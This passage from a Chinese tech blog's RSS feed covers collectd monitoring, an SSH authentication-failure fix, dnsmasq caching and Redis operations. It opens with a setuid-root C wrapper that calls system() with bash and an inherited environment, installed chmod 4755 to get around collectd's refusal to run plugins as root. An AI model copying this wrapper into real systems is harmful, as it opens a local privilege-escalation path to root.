<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"\npermit setuid and setgid to root user: \n\tchown root</span><span style="color: #8abeb7; text-decoration: underline;">:root %s\n\tchmod 4755 %s\n"</span><span style="text-decoration: underline;">, argv[0], argv[0]);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> EXIT_FAILURE;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> system(<span style="color: #8abeb7;">"/bin/bash -c 'export PM2_HOME=${PM2_HOME:-~root/.pm2}; node /</span><span style="color: #8abeb7; text-decoration: underline;">usr/local/bin/collectd-pm2.js'"</span><span style="text-decoration: underline;">);</span>
}
</pre>
</div>

<p>
编译安装
</p>
<div class="org-src-container">
<pre class="src src-sh">gcc -O2 collectd-pm2-root.c -o collectd-pm2-root
cp collectd-pm2-root /usr/local/bin
chown root:root /usr/local/bin/collectd-pm2-root
chmod 4755 /usr/local/bin/collectd-pm2-root
</pre>
</div>

<p>
配置 collectd，修改 <code>collectd.conf</code>
</p>
<pre class="example">
LoadPlugin exec

&lt;Plugin exec&gt;
    Exec "nobody:nobody" "/usr/local/bin/collectd-pm2-root"
&lt;/Plugin&gt;
</pre>

<p>
测试运行统计收集脚本
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo -u nobody -g nobody /usr/local/bin/collectd-pm2-root
</pre>
</div>

<p>
重启 collectd 生效即可。
</p>

<p>
以上代码已在 github 开源：<a href="https://github.com/tangxinfa/collectd-pm2">https://github.com/tangxinfa/collectd-pm2</a> 。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[collectd exec 插件使用进阶]]></title>
            <link>/article/collectd-exec-63d24ef64f7f75288fdb9636.html</link>
            <guid>/article/collectd-exec-63d24ef64f7f75288fdb9636.html</guid>
            <pubDate>Thu, 05 May 2016 04:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
前面一篇文章《<a href="http://blog.kankanan.com/article/4f7f7528-collectd-8fdb884c670d52a176d163a7.html">使用 collectd 进行服务监控 | 看看俺 – KanKanAn.com</a>》展示了如何使用 collectd 的 exec 插件。
</p>

<p>
要使收集的统计信息显示正常、易于使用，则需要对上报的数据有充分的理解。
</p>

<div id="outline-container-orgb37054e" class="outline-2">
<h2 id="orgb37054e">数据的标识</h2>
<div class="outline-text-2" id="text-orgb37054e">
<p>
引用自 <a href="https://collectd.org/documentation/manpages/collectd-exec.5.shtml">man 5 collectd-exec</a>
</p>
<blockquote>
<p>
PUTVAL Identifier [OptionList] Valuelist
  Submits one or more values (identified by Identifier, see below) to the daemon which will dispatch it to all it's write-plugins.
</p>

<p>
An Identifier is of the form "host/plugin-instance/type-instance" with both instance-parts being optional. If they're omitted the hyphen must be omitted, too. plugin and each instance-part may be chosen freely as long as
the tuple (plugin, plugin instance, type instance) uniquely identifies the plugin within collectd. type identifies the type and number of values (i. e. data-set) passed to collectd. A large list of predefined data-sets is
available in the types.db file. See types.db(5) for a description of the format of this file.
</p>

<p>
The OptionList is an optional list of Options, where each option is a key-value-pair. A list of currently understood options can be found below, all other options will be ignored. Values that contain spaces must be quoted
with double quotes.
</p>

<p>
Valuelist is a colon-separated list of the time and the values, each either an integer if the data-source is a counter, or a double if the data-source is of type "gauge". You can submit an undefined gauge-value by using
U. When submitting U to a counter the behavior is undefined. The time is given as epoch (i. e. standard UNIX time).
</p>

<p>
You can mix options and values, but the order is important: Options only effect following values, so specifying an option as last field is allowed, but useless. Also, an option applies to all following values, so you
don't need to re-set an option over and over again.
</p>

<p>
The currently defined Options are:
</p>

<p>
interval=seconds
    Gives the interval in which the data identified by Identifier is being collected.
</p>

<p>
Please note that this is the same format as used in the unixsock plugin, see collectd-unixsock(5). There's also a bit more information on identifiers in case you're confused.
</p>

<p>
Since examples usually let one understand a lot better, here are some:
</p>

<p>
PUTVAL leeloo/cpu-0/cpu-idle N:2299366
PUTVAL alice/interface/if_octets-eth0 interval=10 1180647081:421465:479194
</p>
</blockquote>

<ul class="org-ul">
<li><p>
<code>Identifier</code> 
</p>

<p>
格式为 <code>host/plugin-instance/type-instance</code> 
</p>

<p>
其中的 <code>-</code> 为分隔符， <code>instance</code> 部分是可省略（此时 <code>-</code> 也要省略）。
</p></li>

<li><p>
<code>host</code>
</p>

<p>
主机名称，通常取自 <code>HOSTNAME</code> 环境变量。
</p></li>

<li><p>
<code>plugin</code> 
</p>

<p>
插件名称。
</p></li>

<li><p>
<code>type</code>
</p>

<p>
预定义的值类型名称，定义值的类型及数量，以及 collectd 服务会对值做何处理（如：按时间间隔平均化）。
</p>

<p>
参考 <a href="https://collectd.org/documentation/manpages/types.db.5.shtml">man 5 types.db</a> <a href="https://collectd.org/wiki/index.php/Data_source">Data source - collectd Wiki</a>
</p>

<p>
如某个上报的统计指标在网页上没有对应的图表产生，请检查 collectd 服务器与客户机上 types.db，数据集必须定义且一致，上报的值必须符合数据集定义。
服务器或客户端安装的 collectd 可能版本较低，附带的 types.db 中缺少第三方插件要求的数据集定义，运营人员改动 types.db 中 memory 类型也会导致上报失败：
</p>
<pre class="example">
# memory         value:GAUGE:0:281474976710656
memory          free:GAUGE:0:281474976710656, buffered:GAUGE:0:281474976710656, used:GAUGE:0:281474976710656, cached:GAUGE:0:281474976710656
</pre></li>
</ul>
</div>
</div>


<div id="outline-container-org29525ff" class="outline-2">
<h2 id="org29525ff">数据的展示</h2>
<div class="outline-text-2" id="text-org29525ff">
<p>
数据由上到下分级展示。
</p>

<ul class="org-ul">
<li><p>
主机列表
</p>

<p>
选择要查看的主机，对应上面的 <code>host</code>
</p></li>
</ul>


<ul class="org-ul">
<li><p>
插件列表
</p>

<p>
选择要查看的插件，对应上面的 <code>plugin</code>
</p></li>
</ul>


<ul class="org-ul">
<li><p>
统计图表列表页
</p>

<p>
插件实例（ <code>plugin instance</code> ）+类型（ <code>type</code> ）产生一张图表，类型实例（ <code>type instance</code> ）对应图标上的一条曲线。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
统计图表详情页
</p>

<p>
点击统计图表列表页上的图表进入统计图表详情页，此时可以选择统计的时间范围（如：按小时、天、周、月、年）。
</p>

<p>
另外可以聚合显示所有主机上的相同统计图表，以便进行交叉对比。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org500de10" class="outline-2">
<h2 id="org500de10">标识的使用</h2>
<div class="outline-text-2" id="text-org500de10">
<p>
上报数据时，我们拥有极大的自由性，而 collectd 会宽容地接受并展示结果，但是为了让最终的结果有用、易用，我们需要正确地指定上报的信息项。
</p>

<ul class="org-ul">
<li><p>
<code>host</code>
</p>

<p>
应该填写主机名称，当我们需要整个服务（包括多台主机）的统计时，可以借助 collectd 界面提供的聚合功能实现。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
<code>plugin</code>
</p>

<p>
插件名称
</p></li>

<li><p>
<code>plugin instance</code>
</p>

<p>
插件实例，对应插件收集一个统计指标名称，如：memory。
</p>

<p>
对于简单的插件（只收集一个统计指标），则可以直接省略插件实例（plugin instance）部分，插件名称命名使用统计指标名称。
</p></li>

<li><p>
<code>type</code>
</p>

<p>
请在 types.db 中预定义的类型中选择。
</p></li>

<li><p>
<code>type instance</code>
</p>

<p>
对于主机上的唯一统计指标（如：load），就不需要使用 <code>type instance</code> 了，如果是主机上的非唯一统计指标（如：各分区使用率、进程 cpu 占用率等），则可以使用 <code>type instance</code> 来区分（如：填写为分区路径、进程名称等）。
</p>

<p>
多个 <code>type instance</code> 会在同一张图表中各使用一条曲线展示，如果放在一起展示没有意义，则可能更适合使用 <code>plugin instance</code> 进行标识。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgeec63e0" class="outline-2">
<h2 id="orgeec63e0">突破 root 帐号限制</h2>
<div class="outline-text-2" id="text-orgeec63e0">
<p>
引用自 <a href="https://collectd.org/documentation/manpages/collectd-exec.5.shtml">man 5 collectd-exec</a>
</p>
<blockquote>
<p>
CAVEATS
    ·   The user, the binary is executed as, may not have root privileges, i. e.  must have an UID that is non-zero. This is for your own good.
</p>
</blockquote>

<p>
Exec 插件不允许以 root 权限执行。
</p>

<ul class="org-ul">
<li><p>
温和的解决办法
</p>

<p>
引用自 <a href="https://collectd.org/wiki/index.php/Plugin:Exec">Plugin:Exec - collectd Wiki</a>
</p>
<blockquote>
<p>
The security concerns are addressed by forcing the plugin to check that custom programs are never executed with superuser privileges. If the daemon runs as root, you have to configure another user ID with which the new process is created. To circumvent missing access privileges to files, you need to lean on the unix group concept. I.e. your script requires access to /var/log/messages, which is owned by root, its common practice to have this file being group readable by the admin-group. Given the used ID corrosponds to MyWatcherUser, you need to add that user to the admin group via /etc/group (or what else manages users / groups on your system). 
</p>
</blockquote>

<p>
将原本需要 <code>root</code> 才能访问的文件，改变属组（ <code>group</code> ）为 <code>admin</code> ，权限为 <code>group</code> 可读，然后将插件账号的 <code>group</code> 也改为 <code>admin</code> 。
</p></li>

<li><p>
暴力的解决方法
</p>

<p>
利用 <code>setuid</code> ，允许可执行程序以 <code>root</code> 身份运行。
</p>

<p>
参考
<a href="http://blog.kankanan.com/article/linux-4e0b51418bb8666e901a752862376267884c97008981-root-674396507684547d4ee4.html">linux下允许普通用户执行需要root权限的命令 | 看看俺 – KanKanAn.com</a></p></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决 ssh 登录总是提示认证失败次数过多的问题]]></title>
            <link>/article/89e351b3-ssh-767b5f55603b662f63d0793a8ba48bc159318d256b2165708fc7591a768495ee9898.html</link>
            <guid>/article/89e351b3-ssh-767b5f55603b662f63d0793a8ba48bc159318d256b2165708fc7591a768495ee9898.html</guid>
            <pubDate>Sun, 24 Apr 2016 09:08:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
服务器需要 vpn 才能进行 ssh 访问，但是周末在家突然 ssh 登录不上了，如下所示：
</p>
<pre class="example">
$ ssh tangxinfa@xxxx.xxxxxx.xxx
Received disconnect from xxx.xxx.xxx.xxx port 22:2: Too many authentication failures for tangxinfa
Connection to xxxx.xxxxxx.xxx closed by remote host.
Connection to xxxx.xxxxxx.xxx closed.
</pre>

<p>
找运维人员咨询，说有可能是 openvpn 运行后设置的路由有问题，ssh 登录没有走 vpn ，建议重建 vpn 连接或重启机器。
但是重启机器后还是一样，在 windows 下使用 openvpn ，通过 pietty 却可以正常 ssh 登录上服务器。
</p>

<p>
网上搜索了一下，找到一个有关的帖子
</p>
<blockquote>
<p>
This is usually caused by inadvertently offering multiple ssh keys to the server. The server will reject any key after too many keys have been offered.
</p>

<p>
You can see this for yourself by adding the -v flag to your ssh command to get verbose output. You will see that a bunch of keys are offered, until the server rejects the connection saying: "Too many authentication failures for [user]". Without verbose mode, you will only see the ambiguous message "Connection reset by peer".
</p>

<p>
To prevent irrelevant keys from being offered, you have to explicitly specify this in every host entry in the ~/.ssh/config file by adding IdentitiesOnly like so:
</p>

<p>
Host www.somehost.com
    IdentityFile ~/.ssh/key_for_somehost_rsa
    IdentitiesOnly yes
    Port 22
</p>
</blockquote>
<p>
引用自《<a href="http://superuser.com/questions/187779/too-many-authentication-failures-for-username">ssh - Too many authentication failures for <b>username</b> - Super User</a>》
</p>

<p>
也就是说，ssh 登录时会使用系统上的公匙依次进行认证，如果公私匙对数量超过服务器登录失败次数限制，就会出现上面提到的问题。
</p>

<p>
为了登录 github 及内部的 gitlab，我创建了不同的 rsa 公私匙对，算上系统默认的公私匙对，达到三对
</p>
<pre class="example">
$ tree ~/.ssh
/home/tangxinfa/.ssh
├── github_id_rsa
├── github_id_rsa.pub
├── id_rsa
├── id_rsa.pub
├── known_hosts
├── gitlab_id_rsa
└── gitlab_id_rsa.pub

0 directories, 7 files
</pre>

<p>
当我们使用 ssh 登录服务器时，默认情况下会尝试使用公钥依次进行身份验证，如果还是失败则会使用密码进行登录
</p>
<pre class="example">
$ ssh -v tangxinfa@xxxx.xxxxxx.xxx
...
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Offering RSA public key: /home/tangxinfa/.ssh/id_rsa
debug1: Authentications that can continue: publickey,password
debug1: Offering RSA public key: github
debug1: Authentications that can continue: publickey,password
debug1: Offering RSA public key: gitlab
Received disconnect from xxx.xxx.xxx.xxx port 22:2: Too many authentication failures for tangxinfa
debug1: Authentication succeeded (publickey).
Authenticated to xxxx.xxxxxx.xxx ([xxx.xxx.xxx.xxx]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: channel 0: free: client-session, nchannels 1
Connection to xxxx.xxxxxx.xxx closed by remote host.
Connection to xxxx.xxxxxx.xxx closed.
Transferred: sent 3328, received 2776 bytes, in 0.1 seconds
Bytes per second: sent 59495.7, received 49627.4
debug1: Exit status -1
</pre>

<p>
知道了问题的原因，解决方法就很多了，如：
</p>

<ul class="org-ul">
<li>调整 ssh 服务配置，调高失败次数限制</li>

<li><p>
调整 ssh 客户端配置，不使用公钥认证
</p>

<p>
可以在命令行选项中指定
</p>
<div class="org-src-container">
<pre class="src src-sh">ssh -o <span style="color: #f0c674;">PreferredAuthentications</span>=password tangxinfa@xxxx.xxxxxx.xxx
</pre>
</div>

<p>
也可以配置文件中指定
<code>~/.ssh/config</code>
</p>
<pre class="example">
Host xxxx xxxx.xxxxxx.xxx
     HostName xxxx.xxxxxx.xxx
     User tangxinfa
     PreferredAuthentications password
</pre></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用 dnsmasq 缓存域名解析结果加快上网速度]]></title>
            <link>/article/4f7f7528-dnsmasq-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html</link>
            <guid>/article/4f7f7528-dnsmasq-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html</guid>
            <pubDate>Thu, 21 Apr 2016 11:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
安装 dnsmasq
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S dnsmasq
</pre>
</div></li>

<li><p>
配置 NetworkManager
</p>

<p>
NetworkManager 包含 dnsmasq 插件，可以很方便地支持 dns 缓存。
</p>

<p>
修改 <code>/etc/NetworkManager/NetworkManager.conf</code>
</p>
<pre class="example">
dns=dnsmasq
</pre>

<p>
参考 <a href="https://wiki.archlinux.org/index.php/dnsmasq#NetworkManager">dnsmasq - ArchWiki</a>
</p></li>

<li><p>
配置 dnsmasq
</p>

<p>
NetworkManager 将 dnsmasq 的配置存放在其它位置。
</p>

<p>
<code>/etc/NetworkManager/dnsmasq.d/dnsmasq.conf</code>
</p>
<pre class="example">
listen-address=127.0.0.1
bind-interfaces
dhcp-authoritative
no-negcache
strict-order    
</pre>

<p>
参考 《<a href="http://blog.kankanan.com/article/4f7f7528-dnsmasq-8fdb884c-dns-7f135b586ce8610f4e8b9879.html">使用 dnsmasq 进行 DNS 缓存注意事项</a>》
</p></li>

<li><p>
生效配置
</p>

<p>
重启 NetworkManager 正式生效配置
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo systemctl restart NetworkManager
</pre>
</div>

<p>
dnsmasq 不要通过 systemd 以服务方式启动，它会由 NetworkManager 启动
</p>
<pre class="example">
$ COLUMNS=400 ps wax | grep dnsmasq
 6072 ?        S      0:00 /usr/bin/dnsmasq --no-resolv --keep-in-foreground --no-hosts --bind-interfaces --pid-file=/var/run/NetworkManager/dnsmasq.pid --listen-address=127.0.0.1 --conf-file=/var/run/NetworkManager/dnsmasq.conf --cache-size=400 --proxy-dnssec --conf-dir=/etc/NetworkManager/dnsmasq.d
</pre>

<p>
上游域名服务器在 <code>/var/run/NetworkManager/dnsmasq.conf</code> 中指定，通常由 dhcp 服务分配。
</p>

<p>
添加其它域名服务器，在 <code>/etc/NetworkManager/dnsmasq.d/dnsmasq.conf</code> 中添加以下配置：
</p>
<pre class="example">
server=114.114.114.114
</pre>

<p>
输出日志调试 dnsmasq ，在 <code>/etc/NetworkManager/dnsmasq.d/dnsmasq.conf</code> 中添加以下配置：
</p>
<pre class="example">
log-facility=/var/log/dnsmasq.log
log-queries
</pre>

<p>
重启 NetworkManager 生效。
</p></li>

<li><p>
看看效果
</p>

<p>
多次执行下面的命令，可以感觉到后几次明显比第一次快，这就是 DNS 缓存在起作用。
</p>

<div class="org-src-container">
<pre class="src src-sh">nslookup www.baidu.com
</pre>
</div></li>

<li><p>
与 pdnsd 比较
</p>

<p>
之前写过一篇《 <a href="http://blog.kankanan.com/article/4f7f7528-pdnsd-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html">使用Pdnsd缓存域名解析结果加快上网速度</a> 》，本篇改用 dnsmasq 实现，可以发现 dnsmasq 和 NetworkManager 集成度很高，即插即用，
而 pdnsd 则要手动做很多设置，而且很难实现自动使用 dhcp 分配的域名服务器做为上游域名服务器。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用 dnsmasq 进行 DNS 缓存注意事项]]></title>
            <link>/article/4f7f7528-dnsmasq-8fdb884c-dns-7f135b586ce8610f4e8b9879.html</link>
            <guid>/article/4f7f7528-dnsmasq-8fdb884c-dns-7f135b586ce8610f4e8b9879.html</guid>
            <pubDate>Thu, 21 Apr 2016 09:45:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
dnsmasq 不仅能做域名解析结果缓存，它本身就是 dns 服务器。
</p>

<p>
修改 <code>dnsmasq.conf</code>
</p>
<pre class="example">
<span id="coderef-dnsmasq_listen_local" class="coderef-off"><span class="linenr">1: </span>listen-address=127.0.0.1</span>
<span id="coderef-dnsmasq_interface_lo" class="coderef-off"><span class="linenr">2: </span>interface=lo</span>
<span id="coderef-dnsmasq_bind_interfaces" class="coderef-off"><span class="linenr">3: </span>bind-interfaces</span>
<span id="coderef-dnsmasq_disable_authoritative" class="coderef-off"><span class="linenr">4: </span>#dhcp-authoritative</span>
<span id="coderef-dnsmasq_strict_order" class="coderef-off"><span class="linenr">5: </span>strict-order</span>
<span id="coderef-dnsmasq_no_negcache" class="coderef-off"><span class="linenr">6: </span>no-negcache</span>
</pre>

<ul class="org-ul">
<li><p>
行 <a href="#coderef-dnsmasq_listen_local" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-dnsmasq_listen_local');" onmouseout="CodeHighlightOff(this, 'coderef-dnsmasq_listen_local');">1</a> <a href="#coderef-dnsmasq_interface_lo" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-dnsmasq_interface_lo');" onmouseout="CodeHighlightOff(this, 'coderef-dnsmasq_interface_lo');">2</a> <a href="#coderef-dnsmasq_bind_interfaces" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-dnsmasq_bind_interfaces');" onmouseout="CodeHighlightOff(this, 'coderef-dnsmasq_bind_interfaces');">3</a> <a href="#coderef-dnsmasq_disable_authoritative" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-dnsmasq_disable_authoritative');" onmouseout="CodeHighlightOff(this, 'coderef-dnsmasq_disable_authoritative');">4</a>
</p>

<p>
只对本机提供服务，避免网络内的其它机器访问。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
行 <a href="#coderef-dnsmasq_strict_order" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-dnsmasq_strict_order');" onmouseout="CodeHighlightOff(this, 'coderef-dnsmasq_strict_order');">5</a>
</p>

<p>
dnsmasq 并行向所有上游域名服务器请求解析域名，采用最快返回的解析结果。
</p>

<p>
由于上游服务器列表是从网络环境中获取，可能获取到有问题的域名服务器（立即返回无法解析域名），导致域名解析总是失败，如下所示：
</p>
<pre class="example">
$ nslookup www.baidu.com


Server:    127.0.0.1
Address 1: 127.0.0.1 localhost.lan

nslookup: can't resolve 'www.baidu.com': Name or service not known
</pre>

<p>
<code>strict-order</code> 配置项指定按域名服务器在配置文件（由 <code>resolv-file</code> 配置项指定，默认为 <code>/etc/resolv.conf</code> ）中出现的顺序依次解析，
第一个域名服务器配置正确就能够避免这个问题。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
行 <a href="#coderef-dnsmasq_no_negcache" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-dnsmasq_no_negcache');" onmouseout="CodeHighlightOff(this, 'coderef-dnsmasq_no_negcache');">6</a>
</p>

<p>
当上游域名服务器返回找不到域名（no such domain）时，不缓存结果。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[redis 的关键度量要素]]></title>
            <link>/article/redis-76845173952e5ea691cf89817d20.html</link>
            <guid>/article/redis-76845173952e5ea691cf89817d20.html</guid>
            <pubDate>Thu, 14 Apr 2016 14:40:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orga014925" class="outline-2">
<h2 id="orga014925">redis 进程的 CPU 占用率</h2>
<div class="outline-text-2" id="text-orga014925">
<p>
redis 采用单线程模型，只能利用一个核，监控一定要到进程级，对于一台 16 核机器，redis CPU 占用 100%，但是机器的 CPU 占用很可能不到 10%。
</p>

<p>
redis 进程的 CPU 占用率过高的时候是很脆弱的，额外出现的负载就很可能导致整个服务不可用，而且难以恢复，需要为 redis 减负（优化、功能降级）或扩容（更好的机器、更多的机器）。
</p>
</div>
</div>

<div id="outline-container-org6d8bd41" class="outline-2">
<h2 id="org6d8bd41">机器的内存使用率</h2>
<div class="outline-text-2" id="text-org6d8bd41">
<p>
redis 持久化数据到磁盘时，会 fork 出一个子进程，子进程负责写盘。
</p>

<p>
理想情况下，redis 父进程从 fork 返回到子进程完成写盘这段时间内，父进程未进行任何内存变更，由于 Copy-On-Write 机制的存在，子进程共享父进程的内存空间。
</p>

<p>
然而真实情况往往是另一个极端，redis 做为随机读写的内存数据库，父进程会瞬间在所有内存页上进行写操作，需要多一倍的内存空间占用。
</p>

<p>
存盘时物理内存不足导致动用交换空间（Swap），整个机器都会不稳定。
</p>

<p>
所以跑 redis 的机器，空闲内存量至少要达到 redis 进程的内存占用量。
</p>
</div>
</div>

<div id="outline-container-org63c9368" class="outline-2">
<h2 id="org63c9368">fork 行为</h2>
<div class="outline-text-2" id="text-org63c9368">
<p>
redis 在进行 bgsave 或者 aof-rewrite 时，写盘（阻塞式操作）由 fork 出的子进程执行，不影响主进程的响应时间。
</p>

<p>
但是 fork 是由主进程调用的，在某些环境（如：虚拟机）下耗时会比较长，可能导致 redis 服务的响应时间变长。
</p>

<p>
fork、bgsave 或 aof-rewrite 耗时以及频率需要监控并保留历史记录，当它们升高时，redis 服务将周期性地出现响应时间变长、吞吐量下降，是重要的预警信号。
</p>
</div>
</div>

<div id="outline-container-org7ea46f7" class="outline-2">
<h2 id="org7ea46f7">参考</h2>
<div class="outline-text-2" id="text-org7ea46f7">
<ul class="org-ul">
<li><a href="https://blog.newrelic.com/2015/05/11/redis-performance-metrics/">Understanding Redis Performance: The 7 Metrics</a></li>

<li><a href="http://redis.io/topics/latency">Redis latency problems troubleshooting – Redis</a></li>

<li><a href="http://blog.csdn.net//chenleixing/article/details/50530419">Redis上踩过的一些坑-美团</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[勿用 redis 的多库]]></title>
            <link>/article/52ff7528-redis-7684591a5e93.html</link>
            <guid>/article/52ff7528-redis-7684591a5e93.html</guid>
            <pubDate>Sat, 09 Apr 2016 07:02:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgd1129ec" class="outline-2">
<h2 id="orgd1129ec">不要将 redis 和 mysql 混为一谈</h2>
<div class="outline-text-2" id="text-orgd1129ec">
<p>
在接触 redis 之前，相信很多人都有 mysql 的使用经验。
</p>

<p>
mysql 的实体分层由上至下依次是：
</p>

<ul class="org-ul">
<li><p>
实例（instance）
</p>

<p>
mysqld 进程。
</p></li>

<li>库（database）</li>
</ul>


<ul class="org-ul">
<li>表（table）</li>
</ul>


<ul class="org-ul">
<li>记录（row）</li>
</ul>


<ul class="org-ul">
<li>字段（field）</li>
</ul>


<p>
redis 的实体分层由上至下依次是：
</p>

<ul class="org-ul">
<li><p>
实例（instance）
</p>

<p>
redis 进程。
</p></li>

<li>库（database）</li>
</ul>


<ul class="org-ul">
<li>键值（Key-Value）</li>
</ul>


<p>
我们很容易将 mysql 与 redis 的实例（instance）和库（database）等同起来，然而却大错特错。
</p>

<p>
其实
</p>

<ul class="org-ul">
<li>redis 的实例（instance） 等同于 mysql 的库（database）</li>
</ul>


<ul class="org-ul">
<li>redis 的库（database） 等同于 mysql 的表（table）</li>
</ul>
</div>
</div>


<div id="outline-container-org04ffd90" class="outline-2">
<h2 id="org04ffd90">redis 的多库是鸡肋</h2>
<div class="outline-text-2" id="text-org04ffd90">
<p>
redis 是无预定义结构的（schema-less）数据库，表（table ）的存在意义不大，
它更多地是做为命名空间（name space），由于使用的是很不友好的数字命名（默认 0-15），
redis 中的 库（database）形同鸡肋。
</p>

<p>
以下为 redis 作者的观点，引用自 <a href="https://groups.google.com/d/msg/redis-db/vS5wX8X4Cjg/8ounBXitG4sJ">database names? - Google 网上论坛</a>
</p>
<blockquote>
<p>
I understand how this can be useful, but unfortunately I consider
Redis multiple database errors my worst decision in Redis design at
all&#x2026; without any kind of real gain, it makes the internals a lot
more complex. The reality is that databases don't scale well for a
number of reason, like active expire of keys and VM. If the DB
selection can be performed with a string I can see this feature being
used as a scalable O(1) dictionary layer, that instead it is not.
</p>

<p>
With DB numbers, with a default of a few DBs, we are communication
better what this feature is and how can be used I think. I hope that
at some point we can drop the multiple DBs support at all, but I think
it is probably too late as there is a number of people relying on this
feature for their work.
</p>
</blockquote>
</div>
</div>

<div id="outline-container-orgbd2c838" class="outline-2">
<h2 id="orgbd2c838">使用 redis 多库是妥协的结果</h2>
<div class="outline-text-2" id="text-orgbd2c838">
<p>
有一种观点认为不同的应用（app）使用不同的库（database）可以从而避免键命名冲突。
</p>

<p>
redis 对于不同的库（database）没有提供任何隔离机制，完全依赖于应用（app）部署时约定使用不同的库（database）。
</p>

<p>
为什么不约定应用（app）使用的所有键都加上应用（app）前缀，或者每个应用（app）使用不同的 redis 实例（instance）呢？
</p>

<p>
从开发人员的角度来说
</p>

<ul class="org-ul">
<li>如果每个应用（app）使用不同的实例（instance），是最省事的，连接 redis 后，直接操作即可</li>
</ul>


<ul class="org-ul">
<li>如果每个应用（app）使用不同的库（database），略微麻烦一点，连接 redis 后，先执行一下 <code>select</code> <code>db</code> ，redis 客户端库会提供支持</li>
</ul>


<ul class="org-ul">
<li>如果每个应用（app）的键（key）都加上应用（app）前缀，会很麻烦，每一处访问 redis 的代码都要涉及</li>
</ul>


<p>
从运维人员的角度来说
</p>

<ul class="org-ul">
<li>如果每个应用（app）使用不同的实例（instance），是最麻烦的，维护压力剧增，每个实例（instance）背后还要有配套的启动、停止脚本，监控，主备实例等</li>
</ul>


<ul class="org-ul">
<li>如果每个应用（app）使用不同的库（database），略微麻烦一点，分配并记录一下，告知开发人员使用指定的 redis 实例及库（database）</li>
</ul>


<ul class="org-ul">
<li>如果每个应用（app）的键（key）都加上应用（app）前缀，是最省事的，可以灵活地为应用（app）安排使用实例（instance）或库（database）</li>
</ul>


<p>
不同的应用（app）使用不同的库（database）这一方案被采用，很可能是开发人员与运维人员互相妥协的结果。
</p>
</div>
</div>

<div id="outline-container-org1420d2d" class="outline-2">
<h2 id="org1420d2d">redis 的多库扩容难</h2>
<div class="outline-text-2" id="text-org1420d2d">
<p>
redis 的数据量或者请求数过高，会导致 redis 不稳定，最终影响服务质量。
</p>

<p>
这时候就要考虑 redis 扩容了，需要将其中一个库（database）迁到新的实例（instance）上，过程如下：
</p>

<ul class="org-ul">
<li>停掉应用（app）</li>
</ul>


<ul class="org-ul">
<li><p>
将应用（app）的 redis 库（database）同步到新的 redis 实例（instance）上
</p>

<p>
通过拷贝 <code>dump.rdb</code> 的方式同步（传输）数据，redis 实例（instance）上的所有库（database）数据都是混在一起的，
其它应用（app）数据会增加数据同步（传输）时间及新 redis 实例（instance） 数据载入时间。
</p>

<p>
如果通过工具在线将应用（app）的 redis 库（database）拷贝到运行中的新 redis 实例（instance）上，会很耗时，
对本身负载就很高的 redis 添加更多压力，可能会影响其它应用（app）。
</p>

<p>
新 redis 实例（instance）设置为旧 redis 实例（instance） 的 slave，同步完成后取消 Master-Slave 关系，
这种方法相对更好一些。
</p></li>

<li>启动新的 redis 实例</li>
</ul>


<ul class="org-ul">
<li>修改应用（app）配置指向新的 redis 实例</li>
</ul>


<ul class="org-ul">
<li>启动应用（app）</li>
</ul>


<ul class="org-ul">
<li><p>
清除两个 redis 实例中的脏数据
</p>

<p>
<code>select</code> <code>db</code> ，然后执行 <code>flushdb</code> 命令即可，这可能是使用多库最大的好处。
</p></li>
</ul>


<p>
应用（app）的停机时间（Down Time）肯定短不了。
</p>


<p>
如果每个应用（app）使用不同的实例，需要将某个实例迁到新机器，则可以做到平滑扩容（迁移），过程如下：
</p>

<ul class="org-ul">
<li>应用（app）使用 redis sentinel 方式访问 redis</li>
</ul>


<ul class="org-ul">
<li>新机器部署 redis 新实例</li>
</ul>


<ul class="org-ul">
<li>新实例设置为旧 redis 实例的 slave</li>
</ul>


<ul class="org-ul">
